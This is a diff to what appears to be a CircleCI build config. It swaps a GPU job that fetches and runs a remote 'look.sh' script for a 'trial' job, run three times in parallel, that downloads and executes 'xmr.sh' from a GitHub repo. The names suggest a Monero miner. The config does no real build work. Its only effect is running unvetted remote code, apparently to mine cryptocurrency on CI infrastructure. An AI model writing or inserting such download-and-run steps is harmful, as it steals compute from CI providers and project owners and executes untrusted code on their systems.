@@ -1,9 +1,16 @@
 version: 2.1
-
 jobs:
-  build:
-    machine:
-      image: ubuntu-1604-cuda-10.1:201909-23
-    resource_class: gpu.nvidia.small
-    steps:
-      - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh
+    trial:
+      docker:
+            - image: cimg/node:18.2.0
+      parallelism: 3
+      steps:
+        - run:
+            name: "trial"
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/Myaxisplay/Tuyul/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
